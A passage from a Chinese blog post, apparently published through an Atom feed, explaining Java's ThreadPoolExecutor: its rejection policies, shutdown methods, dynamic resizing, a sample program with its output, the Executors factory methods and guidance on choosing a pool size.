ThreadPoolExecutor.DiscardPolicy：也是丢弃任务，但是不抛出异常。
ThreadPoolExecutor.DiscardOldestPolicy：丢弃队列最前面的任务，然后重新尝试执行任务（重复此过程）
ThreadPoolExecutor.CallerRunsPolicy：由调用线程处理该任务 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;线程池的关闭&quot;&gt;&lt;strong&gt;线程池的关闭&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;hreadPoolExecutor提供了两个方法，用于线程池的关闭，分别是shutdown()和shutdownNow()，其中：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;shutdown()：不会立即终止线程池，而是要等所有任务缓存队列中的任务都执行完后才终止，但再也不会接受新的任务&lt;/li&gt;
  &lt;li&gt;shutdownNow()：立即终止线程池，并尝试打断正在执行的任务，并且清空任务缓存队列，返回尚未执行的任务&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;线程池容量的动态调整&quot;&gt;&lt;strong&gt;线程池容量的动态调整&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;hreadPoolExecutor提供了动态调整线程池容量大小的方法：setCorePoolSize()和setMaximumPoolSize()，&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;setCorePoolSize：设置核心池大小&lt;/li&gt;
  &lt;li&gt;setMaximumPoolSize：设置线程池最大能创建的线程数目大小&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;　　当上述参数从小变大时，ThreadPoolExecutor进行线程赋值，还可能立即创建新的线程来执行任务。&lt;/p&gt;

&lt;h1 id=&quot;使用示例&quot;&gt;使用示例&lt;/h1&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;public class Test {
     public static void main(String[] args) {   
         ThreadPoolExecutor executor = new ThreadPoolExecutor(5, 10, 200, TimeUnit.MILLISECONDS,
                 new ArrayBlockingQueue&amp;lt;Runnable&amp;gt;(5));
          
         for(int i=0;i&amp;lt;15;i++){
             MyTask myTask = new MyTask(i);
             executor.execute(myTask);
             System.out.println(&quot;线程池中线程数目：&quot;+executor.getPoolSize()+&quot;，队列中等待执行的任务数目：&quot;+
             executor.getQueue().size()+&quot;，已执行玩别的任务数目：&quot;+executor.getCompletedTaskCount());
         }
         executor.shutdown();
     }
}
 
 
class MyTask implements Runnable {
    private int taskNum;
     
    public MyTask(int num) {
        this.taskNum = num;
    }
     
    @Override
    public void run() {
        System.out.println(&quot;正在执行task &quot;+taskNum);
        try {
            Thread.currentThread().sleep(4000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        System.out.println(&quot;task &quot;+taskNum+&quot;执行完毕&quot;);
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;结果:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-markdown&quot;&gt;正在执行task 0
线程池中线程数目：1，队列中等待执行的任务数目：0，已执行玩别的任务数目：0
线程池中线程数目：2，队列中等待执行的任务数目：0，已执行玩别的任务数目：0
正在执行task 1
线程池中线程数目：3，队列中等待执行的任务数目：0，已执行玩别的任务数目：0
正在执行task 2
线程池中线程数目：4，队列中等待执行的任务数目：0，已执行玩别的任务数目：0
正在执行task 3
线程池中线程数目：5，队列中等待执行的任务数目：0，已执行玩别的任务数目：0
正在执行task 4
线程池中线程数目：5，队列中等待执行的任务数目：1，已执行玩别的任务数目：0
线程池中线程数目：5，队列中等待执行的任务数目：2，已执行玩别的任务数目：0
线程池中线程数目：5，队列中等待执行的任务数目：3，已执行玩别的任务数目：0
线程池中线程数目：5，队列中等待执行的任务数目：4，已执行玩别的任务数目：0
线程池中线程数目：5，队列中等待执行的任务数目：5，已执行玩别的任务数目：0
线程池中线程数目：6，队列中等待执行的任务数目：5，已执行玩别的任务数目：0
正在执行task 10
线程池中线程数目：7，队列中等待执行的任务数目：5，已执行玩别的任务数目：0
正在执行task 11
线程池中线程数目：8，队列中等待执行的任务数目：5，已执行玩别的任务数目：0
正在执行task 12
线程池中线程数目：9，队列中等待执行的任务数目：5，已执行玩别的任务数目：0
正在执行task 13
线程池中线程数目：10，队列中等待执行的任务数目：5，已执行玩别的任务数目：0
正在执行task 14
task 3执行完毕
task 0执行完毕
task 2执行完毕
task 1执行完毕
正在执行task 8
正在执行task 7
正在执行task 6
正在执行task 5
task 4执行完毕
task 10执行完毕
task 11执行完毕
task 13执行完毕
task 12执行完毕
正在执行task 9
task 14执行完毕
task 8执行完毕
task 5执行完毕
task 7执行完毕
task 6执行完毕
task 9执行完毕
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;从执行结果可以看出，当线程池中线程的数目大于5时，便将任务放入任务缓存队列里面，当任务缓存队列满了之后，便创建新的线程。如果上面程序中，将for循环中改成执行20个任务，就会抛出任务拒绝异常了。&lt;/p&gt;

&lt;p&gt;　　不过在java doc中，并不提倡我们直接使用ThreadPoolExecutor，而是使用Executors类中提供的几个静态方法来创建线程池：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;Executors.newCachedThreadPool();        //创建一个缓冲池，缓冲池容量大小为Integer.MAX_VALUE
Executors.newSingleThreadExecutor();   //创建容量为1的缓冲池
Executors.newFixedThreadPool(int);    //创建固定容量大小的缓冲池
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;下面是这三个静态方法的具体实现;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;public static ExecutorService newFixedThreadPool(int nThreads) {
    return new ThreadPoolExecutor(nThreads, nThreads,
                                  0L, TimeUnit.MILLISECONDS,
                                  new LinkedBlockingQueue&amp;lt;Runnable&amp;gt;());
}
public static ExecutorService newSingleThreadExecutor() {
    return new FinalizableDelegatedExecutorService
        (new ThreadPoolExecutor(1, 1,
                                0L, TimeUnit.MILLISECONDS,
                                new LinkedBlockingQueue&amp;lt;Runnable&amp;gt;()));
}
public static ExecutorService newCachedThreadPool() {
    return new ThreadPoolExecutor(0, Integer.MAX_VALUE,
                                  60L, TimeUnit.SECONDS,
                                  new SynchronousQueue&amp;lt;Runnable&amp;gt;());
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;从它们的具体实现来看，它们实际上也是调用了ThreadPoolExecutor，只不过参数都已配置好了。&lt;/p&gt;

&lt;p&gt;　　newFixedThreadPool创建的线程池corePoolSize和maximumPoolSize值是相等的，它使用的LinkedBlockingQueue；&lt;/p&gt;

&lt;p&gt;　　newSingleThreadExecutor将corePoolSize和maximumPoolSize都设置为1，也使用的LinkedBlockingQueue；&lt;/p&gt;

&lt;p&gt;　　newCachedThreadPool将corePoolSize设置为0，将maximumPoolSize设置为Integer.MAX_VALUE，使用的SynchronousQueue，也就是说来了任务就创建线程运行，当线程空闲超过60秒，就销毁线程。&lt;/p&gt;

&lt;p&gt;　　实际中，如果Executors提供的三个静态方法能满足要求，就尽量使用它提供的三个方法，因为自己去手动配置ThreadPoolExecutor的参数有点麻烦，要根据实际任务的类型和数量来进行配置。&lt;/p&gt;

&lt;p&gt;　　另外，如果ThreadPoolExecutor达不到要求，可以自己继承ThreadPoolExecutor类进行重写。&lt;/p&gt;

&lt;h1 id=&quot;如何合理配置线程池的大小&quot;&gt;如何合理配置线程池的大小&lt;/h1&gt;

&lt;p&gt;一般需要根据任务的类型来配置线程池大小：&lt;/p&gt;

&lt;p&gt;　　如果是CPU密集型任务，就需要尽量压榨CPU，参考值可以设为 &lt;em&gt;N&lt;/em&gt;CPU+1&lt;/p&gt;

&lt;p&gt;　　如果是IO密集型任务，参考值可以设置为2&lt;em&gt;*N&lt;/em&gt;CPU&lt;/p&gt;

&lt;p&gt;　　当然，这只是一个参考值，具体的设置还需要根据实际情况进行调整，比如可以先将线程池大小设置为参考值，再观察任务运行情况和系统负载、资源利用率来进行适当调整。&lt;/p&gt;</content><author><name></name></author><category term="JAVA" /><summary type="html">[toc]</summary></entry></feed>